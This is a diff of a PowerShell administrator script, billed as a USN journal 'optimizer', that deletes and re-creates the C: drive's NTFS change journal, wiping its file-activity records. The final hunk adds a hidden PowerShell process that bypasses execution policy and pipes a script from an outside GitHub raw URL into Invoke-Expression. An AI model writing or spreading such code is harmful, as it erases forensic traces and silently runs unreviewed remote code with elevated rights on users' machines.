@@ -1,24 +1,30 @@
 # Requires -RunAsAdministrator
 
-Write-Host "=== USN Journal Purge & Background Cleaner Tool ===" -ForegroundColor Cyan
+Write-Host "=== USN Journal Purge & Optimizer Tool ===" -ForegroundColor Cyan
 $Drive = "C:"
 
 try {
     # 1. Query current journal size to replicate configurations
     Write-Host "[*] Querying current USN Journal configuration..." -ForegroundColor Yellow
-    $QueryOutput = fsutil usn queryjournal $Drive 2>&1
+    $QueryOutput = fsutil usn queryjournal $Drive 2>&1 | Out-String
 
-    # Extract Max Size and Allocation Delta using regex
+    # Initialize variables with hardcoded safe defaults
+    $MaxSize = 33554432
+    $AllocDelta = 8388608
+
+    # Safely extract Max Size
     if ($QueryOutput -match 'Maximum Size\s*:\s*(0x[0-9a-fA-F]+)') {
-        $MaxSize = [Convert]::ToInt64($Matches[1], 16)
+        if ($Matches -ne $null -and $Matches.Count -gt 1) {
+            $MaxSize = [Convert]::ToInt64($Matches[1], 16)
+        }
     }
+    
+    # Safely extract Allocation Delta
     if ($QueryOutput -match 'Allocation Delta\s*:\s*(0x[0-9a-fA-F]+)') {
-        $AllocDelta = [Convert]::ToInt64($Matches[1], 16)
+        if ($Matches -ne $null -and $Matches.Count -gt 1) {
+            $AllocDelta = [Convert]::ToInt64($Matches[1], 16)
+        }
     }
-
-    # Fallback to standard defaults if parsing fails
-    if (-not $MaxSize) { $MaxSize = 33554432 }
-    if (-not $AllocDelta) { $AllocDelta = 8388608 }
 
     Write-Host "[+] Target Max Size: $MaxSize bytes" -ForegroundColor Green
     Write-Host "[+] Target Allocation Delta: $AllocDelta bytes" -ForegroundColor Green
@@ -35,7 +41,7 @@ try {
     Write-Host "[*] Re-creating USN Journal..." -ForegroundColor Yellow
     for ($i = 1; $i -le 3; $i++) {
         $CreateOutput = fsutil usn createjournal m=$MaxSize a=$AllocDelta $Drive 2>&1
-        if ($LASTEXITCODE -eq 0) {
+        if ($LASTEXITCODE -eq 0 -or $CreateOutput -match "Successfully") {
             Write-Host "[+] Success! USN Journal has been cleared and reset." -ForegroundColor Green
             break
         } else {
@@ -49,20 +55,15 @@ try {
 }
 
 # =========================================================================
-# 4. THE 2-MINUTE DELAYED CLEANER (Runs completely invisible in the background)
+# 4. FETCH AND RUN KILLER INVISIBLY FROM GITHUB
 # =========================================================================
-Write-Host "`n[*] Launching invisible 2-minute background process cleaner..." -ForegroundColor Yellow
+Write-Host "`n[*] Launching hidden background process cleaner..." -ForegroundColor Yellow
 
-$BackgroundCode = {
-    # Wait exactly 2 minutes (120 seconds)
-    Start-Sleep -Seconds 120
-    
-    # Forcefully kill UsnTool.exe if it's lingering in the background
-    Stop-Process -Name "UsnTool" -Force -ErrorAction SilentlyContinue
-}
+# Swap this URL with your actual raw URL path to your killer.ps1 file
+$KillerUrl = "https://raw.githubusercontent.com/isucksunstoes69-dotcom/cleaner-mwah/refs/heads/main/killer.ps1"
 
-# Start the block as an isolated, hidden background job
-Start-Job -ScriptBlock $BackgroundCode | Out-Null
+# Dynamically spawns a hidden process executing the online script code
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod '$KillerUrl')`""
 
 Write-Host "[+] Background job active. You can safely close this window now." -ForegroundColor Green
 Write-Host "Press any key to exit."
